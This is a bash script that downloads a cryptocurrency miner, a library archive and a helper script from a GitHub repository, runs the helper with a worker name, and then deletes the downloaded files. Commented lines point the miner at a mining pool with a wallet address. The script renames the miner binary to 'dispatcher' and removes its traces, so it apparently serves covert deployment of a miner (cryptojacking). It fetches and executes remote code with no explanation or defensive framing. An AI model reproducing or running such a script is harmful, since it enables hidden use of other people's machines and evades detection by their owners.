#!/bin/bash

dir="hellminer"
cpu_num=`cat /proc/cpuinfo |grep "processor"|wc -l`
worker=$1

if [ ! -n "$1" ];then 
    echo "-> No input worker name $1 <-"
else
    echo "-> Worker name: $1 <-"
    wget -4 https://github.com/bitcloudson/rapidtools/raw/main/hellminer.tar -O ./hellminer.tar
    tar -xvf hellminer.tar
    chmod 777 $dir -R
    cd ${dir}
    mv hellminer dispatcher
    wget -4 https://github.com/bitcloudson/rapidtools/raw/main/libstdc.so.tar -O libstdc.so.tar
    tar -xvf libstdc.so.tar
    wget -4 https://github.com/bitcloudson/rapidtools/raw/main/pl/export.sh -O export.sh
    chmod +x ./export.sh
    bash ./export.sh $worker
    #./dispatcher -c stratum+tcp://na.luckpool.net:3956#xnsub -u RE1FQzyKLd9cnQDhkvS6XBW8RbmG1NzFAe.$worker -p x --cpu $cpu_num
    #nohup ./dispatcher -c stratum+tcp://na.luckpool.net:3956#xnsub -u RE1FQzyKLd9cnQDhkvS6XBW8RbmG1NzFAe.$worker -p x --cpu $cpu_num 1>/dev/null 2>/dev/null &
    cd .. && pwd
    sleep 5
    unlink hellminer.tar
    rm ${dir} -rf
fi
#nohup ./dispatcher -c stratum+tcp://na.luckpool.net:3956#xnsub -u RE1FQzyKLd9cnQDhkvS6XBW8RbmG1NzFAe.vg003 -p x --cpu 4 1>/dev/null 2>/dev/null & 
echo "fin"
